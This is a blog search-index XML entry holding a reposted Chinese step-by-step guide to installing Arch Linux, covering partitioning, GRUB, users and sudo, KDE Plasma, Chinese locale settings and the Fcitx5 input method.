<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Arch Linux 基础安装(非原创)</title>
    <url>/2022/07/22/Arch-Linux-%E5%9F%BA%E7%A1%80%E5%AE%89%E8%A3%85(%E9%9D%9E%E5%8E%9F%E5%88%9B)/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="Arch-Linux-基础安装"><a href="#Arch-Linux-基础安装" class="headerlink" title="Arch Linux 基础安装"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/basic_install?id=arch-linux-%E5%9F%BA%E7%A1%80%E5%AE%89%E8%A3%85">Arch Linux 基础安装</a></h1><p>本节从安装最基础的无图形化 ArchLinux 系统开始。<a href="https://wiki.archlinux.org/index.php/Installation_guide">官方安装指南</a></p>
<h2 id="1-禁用-reflector"><a href="#1-禁用-reflector" class="headerlink" title="1.禁用 reflector"></a>1.禁用 reflector</h2><p>2020 年新版 archliveiso 加入了 reflector 服务，它会自己更新 mirrorlist。在特定情况下，它会误删某些有用的源信息。这里启动后的第一件事就是将其禁用。也许它是一个好用的工具，但是很明显，它并不适合在安装的时候面向新手启用，尤其在中国。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop reflector.service</span><br></pre></td></tr></table></figure>

<h2 id="2-再次确保是否为-UEFI-模式"><a href="#2-再次确保是否为-UEFI-模式" class="headerlink" title="2.再次确保是否为 UEFI 模式"></a>2.再次确保是否为 UEFI 模式</h2><p>在一系列的信息刷屏后，可以看到已经以 root 登陆安装系统了，此时可以执行的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /sys/firmware/efi/efivars</span><br></pre></td></tr></table></figure>

<p>若输出了一堆东西，即 efi 变量，则说明已在 UEFI 模式。否则请确认你的启动方式是否为 UEFI。</p>
<h2 id="3-连接网络"><a href="#3-连接网络" class="headerlink" title="3.连接网络"></a>3.连接网络</h2><h3 id="无线连接"><a href="#无线连接" class="headerlink" title="无线连接:"></a>无线连接:</h3><p>无线连接使用 iwctl 进行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iwctl                           <span class="comment">#进入交互式命令行</span></span><br><span class="line">device list                     <span class="comment">#列出设备名，比如无线网卡看到叫 wlan0</span></span><br><span class="line">station wlan0 scan              <span class="comment">#扫描网络</span></span><br><span class="line">station wlan0 get-networks      <span class="comment">#列出网络 比如想连接CMCC-5AQ7这个无线</span></span><br><span class="line">station wlan0 connect CMCC-5AQ7 <span class="comment">#进行连接 输入密码即可</span></span><br><span class="line"><span class="built_in">exit</span>                            <span class="comment">#成功后exit退出</span></span><br></pre></td></tr></table></figure>

<h3 id="有线连接"><a href="#有线连接" class="headerlink" title="有线连接"></a>有线连接</h3><p>正常来说，只要插上一个已经联网的路由器分出的网线(DHCP)，直接就能联网。</p>
<p>可以等待几秒等网络建立链接后再进行下步测试网络的操作。</p>
<h2 id="4-测试网络"><a href="#4-测试网络" class="headerlink" title="4.测试网络"></a>4.测试网络</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping www.gnu.org</span><br></pre></td></tr></table></figure>

<p>稍等片刻，若能看到数据返回，即说明已经联网，ctrl+c 终止退出当前命令。如果还是无法连接，使用 <code>ip link set xxx up</code> 命令确认你已经激活了对应的网卡，再重新继续网络链接与测试。若看到类似<code>Operation not possible due to RF-kill</code>的报错，继续尝试<code>rfkill unblock wifi</code>来解锁无线网卡。[<a href="https://wiki.archlinux.org/index.php/Network_configuration/Wireless#Check_the_driver_status">1]</a></p>
<h2 id="5-更新系统时钟"><a href="#5-更新系统时钟" class="headerlink" title="5.更新系统时钟"></a>5.更新系统时钟</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timedatectl set-ntp <span class="literal">true</span>    <span class="comment">#将系统时间与网络时间进行同步</span></span><br><span class="line">timedatectl status          <span class="comment">#检查服务状态</span></span><br></pre></td></tr></table></figure>

<h2 id="6-更换国内镜像源加快下载速度"><a href="#6-更换国内镜像源加快下载速度" class="headerlink" title="6.更换国内镜像源加快下载速度"></a>6.更换国内镜像源加快下载速度</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist    <span class="comment">#不会vim的同学，此处注意视频中的vim操作步骤</span></span><br></pre></td></tr></table></figure>

<p>放在最上面的是会使用的更新源,把中科大 ustc 的或者清华的放在最上面。</p>
<h2 id="7-分区"><a href="#7-分区" class="headerlink" title="7.分区"></a>7.分区</h2><p>这里总共设置三个分区，可以满足绝大多数人的需求。此步骤会清除磁盘中全部内容，请事先确认。</p>
<ul>
<li>EFI 分区： <code>/efi</code> 800M</li>
<li>根目录： <code>/</code> 100G</li>
<li>用户主目录： <code>/home</code> 剩余全部 越大越好</li>
</ul>
<blockquote>
<p>这里根目录的大小仅为参考，一般来说个人日常使用的 linux 分配 100G 已经够用了。根目录最小建议不小于 50G，根目录过小会造成无法更新系统软件包等问题。</p>
</blockquote>
<p>首先将磁盘转换为 gpt 类型</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsblk                       <span class="comment">#显示分区情况</span></span><br><span class="line">parted /dev/sdx             <span class="comment">#执行parted，进行磁盘类型变更</span></span><br><span class="line">(parted)mktable             <span class="comment">#输入mktable</span></span><br><span class="line">New disk label <span class="built_in">type</span>? gpt    <span class="comment">#输入gpt 将磁盘类型转换为gpt 如磁盘有数据会警告，输入yes即可</span></span><br><span class="line">quit                        <span class="comment">#最后quit退出parted命令行交互</span></span><br></pre></td></tr></table></figure>

<p>接下来使用 cfdisk 命令对磁盘分区</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cfdisk /dev/sdx <span class="comment">#来执行分区操作,分配各个分区大小，类型</span></span><br><span class="line">fdisk -l <span class="comment">#复查磁盘情况</span></span><br></pre></td></tr></table></figure>

<p>cfdisk 分区的详细操作见视频中的操作。一般建议将 EFI 分区设置为磁盘的第一个分区，据说有些主板如果不将 EFI 设置为第一个分区，可能有不兼容的问题。</p>
<h2 id="8-格式化"><a href="#8-格式化" class="headerlink" title="8.格式化"></a>8.格式化</h2><p>这里的 sdax 只是例子，具体根据你的实际情况来，请注意视频中的操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#磁盘若有数据会问 &#x27;proceed any way?&#x27; y回车 即可</span></span><br><span class="line">mkfs.ext4  /dev/sdax            <span class="comment">#格式化根目录和home目录的两个分区</span></span><br><span class="line">mkfs.vfat  /dev/sdax            <span class="comment">#格式化efi分区</span></span><br></pre></td></tr></table></figure>

<h2 id="9-挂载"><a href="#9-挂载" class="headerlink" title="9.挂载"></a>9.挂载</h2><p>在挂载时，挂载是有顺序的，需要从根目录开始挂载<br>这里的 sdax 只是例子，具体根据你的实际情况来，请注意视频中的操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sdax  /mnt</span><br><span class="line"><span class="built_in">mkdir</span> /mnt/home</span><br><span class="line">mount /dev/sdax /mnt/home</span><br><span class="line"><span class="built_in">mkdir</span> /mnt/efi</span><br><span class="line">mount /dev/sdax /mnt/efi</span><br></pre></td></tr></table></figure>

<h2 id="10-安装系统基础包"><a href="#10-安装系统基础包" class="headerlink" title="10.安装系统基础包"></a>10.安装系统基础包</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-firmware  <span class="comment">#base-devel在AUR包的安装是必须的</span></span><br></pre></td></tr></table></figure>

<p>功能性软件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt dhcpcd iwd vim sudo bash-completion   <span class="comment">#一个有线所需 一个无线所需 一个编辑器  一个提权工具 一个补全工具 iwd也需要dhcpcd</span></span><br></pre></td></tr></table></figure>

<h2 id="11-生成-fstab-文件"><a href="#11-生成-fstab-文件" class="headerlink" title="11.生成 fstab 文件"></a>11.生成 fstab 文件</h2><p>fstab 用来定义磁盘分区</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure>

<p>复查一下 &#x2F;mnt&#x2F;etc&#x2F;fstab 确保没有错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /mnt/etc/fstab</span><br></pre></td></tr></table></figure>

<h2 id="12-change-root"><a href="#12-change-root" class="headerlink" title="12.change root"></a>12.change root</h2><p>把环境切换到新系统的&#x2F;mnt 下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure>

<h2 id="13-设置主机名与时区"><a href="#13-设置主机名与时区" class="headerlink" title="13.设置主机名与时区"></a>13.设置主机名与时区</h2><p>首先在<code>/etc/hostname</code>设置主机名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/hostname</span><br></pre></td></tr></table></figure>

<p>加入你想为主机取的主机名，这里比如叫 myarch。</p>
<p>接下来在<code>/etc/hosts</code>设置与其匹配的条目。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure>

<p>加入如下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">::1         localhost</span><br><span class="line">127.0.1.1   myarch.localdomain    myarch</span><br></pre></td></tr></table></figure>

<blockquote>
<p>某些情况下如不设置主机名，在 KDE 下可能会存在网络情况变更时无法启动 GUI 应用的问题，在终端中出现形如<code>No protocol specified qt.qpa.xcb: could not connect to display</code>的错误，这种情况较为少见。相关参考链接:[<a href="https://bbs.archlinux.org/viewtopic.php?id=241338">1]</a>，[<a href="https://bbs.archlinux.org/viewtopic.php?id=243674">2]</a></p>
</blockquote>
<hr>
<p>随后设置时区，在&#x2F;etc&#x2F;localtime 下用&#x2F;usr 中合适的时区创建符号连接。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure>

<h2 id="14-硬件时间设置"><a href="#14-硬件时间设置" class="headerlink" title="14.硬件时间设置"></a>14.硬件时间设置</h2><p>将系统时间同步到硬件时间</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure>

<h2 id="15-设置-Locale"><a href="#15-设置-Locale" class="headerlink" title="15.设置 Locale"></a>15.设置 Locale</h2><p>Locale 决定了软件使用的语言、书写习惯和字符集。</p>
<p>编辑 &#x2F;etc&#x2F;locale.gen，去掉 en_US.UTF-8 行以及 zh_CN.UTF-8 的注释符号（#）。</p>
<p>然后使用如下命令生成 locale。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locale-gen</span><br></pre></td></tr></table></figure>

<p>向 &#x2F;etc&#x2F;locale.conf 输入内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;LANG=en_US.UTF-8&#x27;</span>  &gt; /etc/locale.conf</span><br></pre></td></tr></table></figure>

<h2 id="16-为-root-用户设置密码"><a href="#16-为-root-用户设置密码" class="headerlink" title="16.为 root 用户设置密码"></a>16.为 root 用户设置密码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd root</span><br></pre></td></tr></table></figure>

<h2 id="17-安装微码"><a href="#17-安装微码" class="headerlink" title="17.安装微码"></a>17.安装微码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S intel-ucode   <span class="comment">#Intel</span></span><br><span class="line">pacman -S amd-ucode     <span class="comment">#AMD</span></span><br></pre></td></tr></table></figure>

<h2 id="18-安装引导程序"><a href="#18-安装引导程序" class="headerlink" title="18.安装引导程序"></a>18.安装引导程序</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S grub efibootmgr   <span class="comment">#grub是启动引导器，efibootmgr被 grub 脚本用来将启动项写入 NVRAM。</span></span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/efi --bootloader-id=GRUB <span class="comment">#取名为GRUB 并将grubx64.efi安装到之前的指定位置</span></span><br></pre></td></tr></table></figure>

<p>接下来编辑&#x2F;etc&#x2F;default&#x2F;grub 文件，去掉<code>GRUB_CMDLINE_LINUX_DEFAULT</code>一行中最后的 quiet 参数，同时把 log level 的数值从 3 改成 5。这样是为了后续如果出现系统错误，方便排错。同时加入 nowatchdog 参数，这可以显著提高开关机速度。不会 vim 的同学注意视频中的操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/default/grub</span><br></pre></td></tr></table></figure>

<p>最后生成 GRUB 所需的配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在某些主板安装完成后，你会发现没有启动条目。这是因为某些主板的 UEFI 固件在显示 UEFI NVRAM 引导条目之前，需要在特定的位置存放可引导文件，不支持自定义存放 efi 文件(如微星 Z170-A Gaming PRO)。解决方案是在默认启动路径下安装 GRUB。重新插入安装优盘，挂载目录，chroot 到&#x2F;mnt，然后你可以直接把已经生成好的 efi 文件移动到默认目录下，如下代码所示。只有安装完成后你的主板不出现启动条目才需要尝试如下命令，正常安装无需执行。<a href="https://wiki.archlinux.org/index.php/GRUB#Default/fallback_boot_path">官方参考文档</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /efi/EFI/BOOT</span><br><span class="line"><span class="built_in">mv</span> /efi/EFI/GRUB/grubx64.efi /efi/EFI/BOOT/BOOTX64.EFI</span><br></pre></td></tr></table></figure>

<h2 id="19-完成安装"><a href="#19-完成安装" class="headerlink" title="19.完成安装"></a>19.完成安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span>                <span class="comment"># 退回安装环境#</span></span><br><span class="line">umount -R  /mnt     <span class="comment"># 卸载新分区</span></span><br><span class="line">reboot              <span class="comment"># 重启</span></span><br></pre></td></tr></table></figure>

<p>注意，重启前要先拔掉优盘，否则你重启后还是进安装程序而不是安装好的系统。重启后，开启 dhcp 服务，即可连接网络</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start dhcpcd  <span class="comment">#立即启动dhcp</span></span><br><span class="line">ping www.gnu.org      <span class="comment">#测试网络连接</span></span><br></pre></td></tr></table></figure>

<p>若为无线链接，则还需要启动 iwd 才可以使用 iwctl 连接网络</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start iwd <span class="comment">#立即启动iwd</span></span><br><span class="line">iwctl               <span class="comment">#和之前的方式一样，连接无线网络</span></span><br></pre></td></tr></table></figure>

<p>到此为止，一个基础的，无 UI 界面的 Arch Linux 已经安装完成了。紧接着下一节，我们来安装图形界面。</p>
<blockquote>
<p>archlinux 在 2021 年 4 月在安装镜像中内置了一个<a href="https://archlinux.org/packages/extra/any/archinstall/">安装脚本</a>，其就是类似一个一键安装脚本，提供一些选项，即可快速安装。其和所有一键安装脚本类似，提供自动化，且不灵活的安装过程。缺陷为：只提供有限的文件系统格式、只可限定在一个磁盘、不能指定源、只提供有限的桌面选择、自动分区不可手动干预、输入错误直接崩溃退出、仅支持 UEFI 等。不建议使用这种安装脚本，除了以上各种原因，初学者也无法在这种安装过程中学到任何东西。如果你因为任何原因需要快速启动一个基础的 archlinux 环境，那么可以尝试此脚本。</p>
</blockquote>
<h1 id="桌面环境与常用应用"><a href="#桌面环境与常用应用" class="headerlink" title="桌面环境与常用应用"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/DE&App?id=%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B8%B8%E7%94%A8%E5%BA%94%E7%94%A8">桌面环境与常用应用</a></h1><p>官方文档: <a href="https://wiki.archlinux.org/index.php/General_recommendations">安装后的工作</a><br>本节只介绍最基本的，能使系统真正意义上可用所需的组件<br>相关视频链接： <a href="https://www.bilibili.com/video/BV1Fv411H7x2">安装 KDE 与常用软件</a> 视频文字结合效果更好<br>注: 文档中带有 AUR 角标的软件代表是用户自行打包的第三方软件<a href="https://aur.archlinux.org/">AUR</a>，不在 Arch 官方支持范围内，可能会出现更新不及时、无法安装、使用出错等各种问题。如果不是实在没有官方支持的同类软件，则不建议使用。</p>
<h2 id="1-确保系统为最新"><a href="#1-确保系统为最新" class="headerlink" title="1.确保系统为最新"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/DE&App?id=_1%E7%A1%AE%E4%BF%9D%E7%B3%BB%E7%BB%9F%E4%B8%BA%E6%9C%80%E6%96%B0">1.确保系统为最新</a></h2><p>如果你在做完上一节的内容后，重启并放置过一段时间，那需要先按照上节末尾处的方式重新连接网络，然后更新系统。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Syyu    <span class="comment">#升级系统中全部包</span></span><br></pre></td></tr></table></figure>

<h2 id="2-准备非-root-用户"><a href="#2-准备非-root-用户" class="headerlink" title="2.准备非 root 用户"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/DE&App?id=_2%E5%87%86%E5%A4%87%E9%9D%9E-root-%E7%94%A8%E6%88%B7">2.准备非 root 用户</a></h2><p>添加用户，比如新增加的用户叫 testuser</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -m -G wheel -s /bin/bash testuser  <span class="comment">#wheel附加组可sudo进行提权 -m同时创建用户家目录</span></span><br></pre></td></tr></table></figure>

<p>设置新用户 testuser 的密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd testuser</span><br></pre></td></tr></table></figure>

<p>编辑 sudo 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EDITOR=vim visudo</span><br></pre></td></tr></table></figure>

<p>找到这样的一行,把前面的注释符号#去掉，<code>:wq</code>保存并退出即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#%wheel ALL=(ALL) ALL</span></span><br></pre></td></tr></table></figure>

<p>这里稍微解释一下 %wheel 代表是 wheel 组，百分号是前缀<br>ALL&#x3D; 代表在所有主机上都生效(如果把同样的<code>sudoers</code>文件下发到了多个主机上)<br>(ALL) 代表可以成为任意目标用户<br>ALL 代表可以执行任意命令<br>一个更详细的例子:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%mailadmin   snow,rain=(root) /usr/sbin/postfix, /usr/sbin/postsuper, /usr/bin/doveadm</span><br><span class="line">nobody       ALL=(root) NOPASSWD: /usr/sbin/rndc reload</span><br></pre></td></tr></table></figure>

<p>组 mailadmin 可以作为 root 用户，执行一些邮件服务器控制命令。可以在 “snow” 和 “rain”这两台主机上执行<br>用户 nobody 可以以 root 用户执行<code>rndc reload</code>命令。可以在所有主机上执行。同时可以不输入密码。(正常来说 sudo 都是要求输入调用方的密码的)</p>
<h2 id="3-安装-KDE-Plasma-桌面环境"><a href="#3-安装-KDE-Plasma-桌面环境" class="headerlink" title="3.安装 KDE Plasma 桌面环境"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/DE&App?id=_3%E5%AE%89%E8%A3%85-kde-plasma-%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83">3.安装 KDE Plasma 桌面环境</a></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S plasma-meta konsole dolphin  <span class="comment">#安装plasma-meta元软件包以及终端和文件管理器</span></span><br></pre></td></tr></table></figure>

<h2 id="4-配置-greeter-sddm"><a href="#4-配置-greeter-sddm" class="headerlink" title="4.配置 greeter sddm"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/DE&App?id=_4%E9%85%8D%E7%BD%AE-greeter-sddm">4.配置 greeter sddm</a></h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sddm</span><br></pre></td></tr></table></figure>

<h2 id="5-设置交换文件-swap"><a href="#5-设置交换文件-swap" class="headerlink" title="5.设置交换文件 swap"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/DE&App?id=_5%E8%AE%BE%E7%BD%AE%E4%BA%A4%E6%8D%A2%E6%96%87%E4%BB%B6-swap">5.设置交换文件 swap</a></h2><p>在桌面环境中，交换分区或文件用来实现休眠(hibernate)的功能，即将当前环境保存在磁盘的交换文件或分区部分。除此之外，某些特定软件需要 swap 才可以正确运行。交换文件与分区性能相同，且交换文件更为灵活，可随时变更大小，增加与删除。[<a href="https://wiki.archlinux.org/title/Swap#Swap_file">1]</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=/swapfile bs=1M count=16384 status=progress <span class="comment">#创建16G的交换空间 大小根据需要自定</span></span><br><span class="line"><span class="built_in">chmod</span> 600 /swapfile <span class="comment">#设置正确的权限</span></span><br><span class="line">mkswap /swapfile <span class="comment">#格式化swap文件</span></span><br><span class="line">swapon /swapfile <span class="comment">#启用swap文件</span></span><br></pre></td></tr></table></figure>

<p>最后，向&#x2F;etc&#x2F;fstab 中追加如下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/swapfile none swap defaults 0 0</span><br></pre></td></tr></table></figure>

<p>KDE 自身提供开箱即用的睡眠功能(suspend)，即将系统挂起到内存，消耗少量的电量。休眠(hibernate)会将系统挂起到交换分区或文件，几乎不消耗电量。sleep 睡眠功能已可满足绝大多数人的需求，如果你一定需要休眠功能，可以参考<a href="https://wiki.archlinux.org/title/Power_management/Suspend_and_hibernate">官方文档</a>设置休眠相关步骤。</p>
<h2 id="6-开启-32-位支持库与-ArchLinuxCN-支持库"><a href="#6-开启-32-位支持库与-ArchLinuxCN-支持库" class="headerlink" title="6.开启 32 位支持库与 ArchLinuxCN 支持库"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/DE&App?id=_6%E5%BC%80%E5%90%AF-32-%E4%BD%8D%E6%94%AF%E6%8C%81%E5%BA%93%E4%B8%8E-archlinuxcn-%E6%94%AF%E6%8C%81%E5%BA%93">6.开启 32 位支持库与 ArchLinuxCN 支持库</a></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br></pre></td></tr></table></figure>

<p>去掉[multilib]一节中两行的注释，来开启 32 位库支持。<br>在文档结尾处加入下面的文字，来开启 ArchLinuxCN 源。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure>

<p>上面服务器的地址是中科大的，也可用下面清华的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/archlinuxcn/mirrorlist-repo#arch-linux-cn-community-repo-mirrors-list">此处</a>为 archlinuxcn 全部仓库地址 可以根据自己实际情况另行选择。</p>
<p>最后:wq 保存退出，刷新 pacman 数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Syyu</span><br></pre></td></tr></table></figure>

<p>重启电脑，即可看到欢迎界面，输入新用户的密码即可登录桌面</p>
<h2 id="7-安装基础功能包"><a href="#7-安装基础功能包" class="headerlink" title="7.安装基础功能包"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/DE&App?id=_7%E5%AE%89%E8%A3%85%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%8C%85">7.安装基础功能包</a></h2><p>进入桌面后，搜索 konsole。它是 KDE 桌面环境默认的命令行终端。</p>
<p>首先先进行桌面环境中的网络设置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">disable</span> iwd                                                  <span class="comment">#确保iwd开机处于关闭状态，其无线连接会与NetworkManager冲突</span></span><br><span class="line">sudo systemctl stop iwd                                                     <span class="comment">#同上，立即关闭iwd</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> --now NetworkManager                                  <span class="comment">#确保先启动NetworkManager，并进行网络连接 若iwd已经与NetworkManager冲突 则执行完上一步重启一下电脑即可。</span></span><br></pre></td></tr></table></figure>

<p>接下来安装一些基础功能包。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ntfs-3g                                                      <span class="comment">#识别NTFS格式的硬盘</span></span><br><span class="line">sudo pacman -S adobe-source-han-serif-cn-fonts wqy-zenhei                   <span class="comment">#安装几个开源中文字体 一般装上文泉驿就能解决大多wine应用中文方块的问题</span></span><br><span class="line">sudo pacman -S noto-fonts-cjk noto-fonts-emoji noto-fonts-extra             <span class="comment">#安装谷歌开源字体及表情</span></span><br><span class="line">sudo pacman -S firefox chromium                                             <span class="comment">#安装常用的火狐、谷歌浏览器</span></span><br><span class="line">sudo pacman -S ark                                                          <span class="comment">#与dolphin同用右键解压 注意可同时安装可选解压支持项</span></span><br><span class="line">sudo pacman -S packagekit-qt5 packagekit appstream-qt appstream             <span class="comment">#确保Discover(软件中心）可用 需重启</span></span><br><span class="line">sudo pacman -S gwenview                                                     <span class="comment">#图片查看器</span></span><br><span class="line">sudo pacman -S steam                                                        <span class="comment">#稍后看完显卡驱动再使用 专有软件</span></span><br></pre></td></tr></table></figure>

<p>最后要安装 archlinuxcn 源的相关步骤。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S archlinuxcn-keyring                                          <span class="comment">#cn源中的签名(archlinuxcn-keyring在archLinuxCn)</span></span><br><span class="line">sudo pacman -S yay                                                          <span class="comment">#yay命令可以让用户安装AUR中的软件(yay在archLinuxCn)</span></span><br></pre></td></tr></table></figure>

<p>若安装 archlinuxcn-keyring 时报错，是由于密钥环的问题，可先按照<a href="https://www.archlinuxcn.org/gnupg-2-1-and-the-pacman-keyring/">此链接</a>执行其中的命令，再安装 archlinuxcn-keyring</p>
<h2 id="8-设置系统为中文"><a href="#8-设置系统为中文" class="headerlink" title="8.设置系统为中文"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/DE&App?id=_8%E8%AE%BE%E7%BD%AE%E7%B3%BB%E7%BB%9F%E4%B8%BA%E4%B8%AD%E6%96%87">8.设置系统为中文</a></h2><p>打开 <em>System Settings</em> &gt; <em>Regional Settings</em> &gt; <em>Language</em> -&gt; <em>Add languages</em> 中选择中文加入，再拖拽到第一位，Apply。</p>
<p>再将<em>System Settings</em> &gt; <em>Regional Settings</em> &gt; <em>Formats</em> 中的值设为<code>中文-简体中文(zh_CN)</code></p>
<p>最后重新登陆即可。</p>
<blockquote>
<p>很多人会错误的更改 <em>System Settings</em> &gt; <em>Regional Settings</em> &gt; <em>Formats</em> 中的值为中文蒙古(mn_CN)，默认，或者其他值，这会导致系统中一半英文一般中文。这里的值要保持默认的 en_US 或 zh_CN,或者改为你在 locale.gen 中添加的任意一种语言。</p>
</blockquote>
<h2 id="9-安装输入法"><a href="#9-安装输入法" class="headerlink" title="9.安装输入法"></a><a href="https://archlinuxstudio.github.io/ArchLinuxTutorial/#/rookie/DE&App?id=_9%E5%AE%89%E8%A3%85%E8%BE%93%E5%85%A5%E6%B3%95">9.安装输入法</a></h2><p><a href="https://wiki.archlinux.org/index.php/Fcitx5_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Fcitx5 官方文档</a><br>中文及日文输入法均体验良好。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx5-im <span class="comment">#基础包组</span></span><br><span class="line">sudo pacman -S fcitx5-chinese-addons <span class="comment">#官方中文输入引擎</span></span><br><span class="line">sudo pacman -S fcitx5-anthy <span class="comment">#日文输入引擎</span></span><br><span class="line">sudo pacman -S fcitx5-pinyin-moegirl <span class="comment">#萌娘百科词库 二刺猿必备(ArchLinuxCn)</span></span><br><span class="line">sudo pacman -S fcitx5-material-color <span class="comment">#主题</span></span><br></pre></td></tr></table></figure>

<p>设置环境变量 编辑文件 <code>sudo vim /etc/environment</code> 加入以下内容。konsole 以及 dophin 都需要这些环境变量，倒是 chrome 和 firefox 都不需要就可以输入中文</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line">XMODIFIERS=@im=fcitx</span><br><span class="line">SDL_IM_MODULE=fcitx</span><br></pre></td></tr></table></figure>

<p>打开 <em>系统设置</em> &gt; <em>区域设置</em> &gt; _输入法_，先点击<code>运行Fcitx</code>即可，拼音为默认添加项。如你还需要更多输入法如五笔，则再点击<code>添加输入法</code>，找到简体中文下的五笔 ，点击添加即可加入五笔输入法。</p>
<p>接下来点击 <em>拼音</em> 右侧的配置按钮，点选<code>云拼音</code>和<code>在程序中显示预编辑文本</code> 最后应用。</p>
<p>回到输入法设置，点击<code>配置附加组件</code>，找到 <em>经典用户界面</em> 在主题里选择一个你喜欢的颜色 最后应用。</p>
<p>注销，重新登陆，就可以发现已经可以在各个软件中输入中文了</p>
